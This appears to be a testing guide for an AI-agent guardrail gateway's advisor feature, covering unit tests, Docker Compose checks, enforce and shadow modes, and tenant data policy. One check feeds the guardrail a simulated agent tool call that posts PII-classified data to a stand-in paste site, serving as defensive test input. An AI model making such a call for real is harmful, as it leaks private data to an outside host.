# Testing advisors

Part 1 is the automated tests; Part 2 is a short walk through the Docker Compose stack that makes
an advisor change a decision and shows the pilot analytics.

## Part 1: automated tests

```bash
cd services/guardrail-gateway && pip install -r requirements-dev.txt
pytest -q tests/test_advisors.py                      # contract, panel rules, providers, flow
cd ../guardrail-control-plane && pytest -q tests/test_services.py -k advisor
cd ../../apps/console && npm test                      # advisor helpers and API client
```

| Test | Proves |
| --- | --- |
| `test_questions_carry_derived_features_never_text` | the question has no payload text, values or host names |
| `test_answers_are_strict`, `test_points_are_capped_and_never_negative` | typed answers; benign adds nothing |
| `test_only_the_uncertain_band` | advisors run for elevated/high, not low or critical |
| `test_shadow_advisors_change_nothing_but_are_recorded` | shadow mode is audit-only |
| `test_caps_per_advisor_and_in_total` | per-advisor cap and the total cap |
| `test_failures_are_no_signal` | timeout, error, garbage and injected extra fields all count as no signal |
| `test_hosted_advisors_follow_the_tenant_data_policy` | a hosted advisor is skipped unless the tenant opted in |
| `test_advisor_verify_only_tightens_the_table` | `ADVISOR_VERIFY` can only make the outcome stricter |
| `test_flow_enforcing_advisor_tightens_and_the_agent_never_sees_why` | end to end; the agent never learns the advisor's name or output |
| `test_tenant_advisor_policy_is_opt_in_and_published` | the data policy, its gateway-capability guard, and the catalog |
| `test_advisor_pilot_analytics_shapes_the_audit_rows` | the pilot analytics over the audit log |

## Part 2: the live stack

```bash
docker compose up --build -d          # ADVISORS_JSON seeds the local advisor in shadow mode
until curl -sf localhost:8100/ready >/dev/null; do sleep 2; done
GW=$(docker compose exec -T guardrail-gateway sh -c '. /bootstrap/dev.env; echo $DEMO_GATEWAY_API_KEY')
guard() { curl -s localhost:8100/v1/guard/tool -H "X-API-Key: $GW" -H 'Content-Type: application/json' -d "$1"; }
```

### Check 1: shadow by default (nothing changes, the answer is recorded)

```bash
guard '{"agent_id": "research-agent", "action": "http.post", "session_id": "s1",
  "data_classification": "PII",
  "payload": {"tool_call": {"name": "http.post", "arguments":
    {"url": "https://paste.example.net/x?d=AAAA", "method": "POST", "body": "export"}}}}' | jq '{outcome, risk: .risk.score, mode: .risk.mode, codes: .reason_codes, advisors: .risk.advisors}'
```

The default `RISK_MODE=shadow` means `mode: "shadow"` and the outcome is unchanged, but
`risk.advisors` lists the local advisor's answer for each question. (`risk.advisors` is in the API
response here because shadow mode returns the full assessment; in enforce mode the agent would not
see it — only the audit record would.)

### Check 2: an advisor tightening a decision (enforce)

```bash
RISK_MODE=enforce ADVISORS_JSON='[{"name":"local","provider":"local","mode":"enforce","cap":15}]' \
  docker compose up -d guardrail-gateway
until curl -sf localhost:8100/ready >/dev/null; do sleep 2; done
GW=$(docker compose exec -T guardrail-gateway sh -c '. /bootstrap/dev.env; echo $DEMO_GATEWAY_API_KEY')
```

Re-run the Check 1 request. Now the local advisor's points push the request higher and, if it asks
for verification, the outcome becomes `verify` (HTTP 202) with `ADVISOR_RISK` among the reason
codes — never `ADVISOR_*` naming the advisor. A plain, low-risk call is still allowed:

```bash
guard '{"agent_id": "research-agent", "action": "kb.search", "session_id": "s2",
  "payload": {"tool_call": {"name": "kb.search", "arguments": {"q": "refund policy"}}}}' | jq .outcome   # "allow" (advisors skip low risk)
```

### Check 3: the pilot analytics

```bash
ADMIN=$(docker compose exec -T guardrail-control-plane sh -c '. /bootstrap/cp.env; echo $CP_ADMIN_KEY')
curl -s localhost:8200/cp/v1/analytics/advisors -H "X-Admin-Key: $ADMIN" | jq '.advisors[] | {advisor, mode, questions, no_signal_rate, agreement}'
```

Each advisor shows its answer counts, how often it produced no signal, and its agreement with the
final outcome. In the console, open **Advisors** (under Observe): the table plus, with a tenant
selected, the **hosted advisor data policy** (local advisors ignore it).

### Check 4: a hosted advisor needs the tenant to opt in

```bash
ADVISORS_JSON='[{"name":"jev","provider":"http","mode":"shadow","options":{"url":"http://mcp-demo:8765/noop","allow_http":true}}]' \
  docker compose up -d guardrail-gateway
```

With no advisor policy set for the `demo` tenant, the hosted advisor is skipped
(`status: skipped_policy` in the audit record, nothing sent). Opt in, and it is asked:

```bash
curl -s -X PUT localhost:8200/cp/v1/tenants/demo/advisor-policy -H "X-Admin-Key: $ADMIN" \
  -H 'Content-Type: application/json' -d '{"data_classes": ["PUBLIC", "INTERNAL", "PII"]}' | jq .advisor_data_classes
```

## What "working" looks like

| Check | Pass when |
| --- | --- |
| Shadow | decisions unchanged; `risk.advisors` records each answer |
| Enforce | the advisor can raise risk / ask to verify, never permit; the agent never sees the advisor |
| Band | low-risk requests skip advisors entirely |
| Policy | a hosted advisor is skipped until the tenant opts in for the data class |
| Analytics | the Advisors page and `/analytics/advisors` show answers, no-signal rate and agreement |

## Troubleshooting

| Symptom | Likely cause |
| --- | --- |
| gateway won't start: "unknown advisor provider" | a typo in `ADVISORS_JSON`'s `provider` |
| gateway won't start: "must start with ADVISOR_SECRET_" | an `http` advisor's `auth_env` names a non-`ADVISOR_SECRET_*` variable |
| advisor always `no signal` | the endpoint is slow (raise `timeout_ms`), unreachable, or returns a non-conforming body |
| hosted advisor always `skipped_policy` | the tenant hasn't opted in for the request's data class |
| turning on a tenant policy returns 422 | a live gateway is older than 0.9 (no `advisors_v1` capability) |
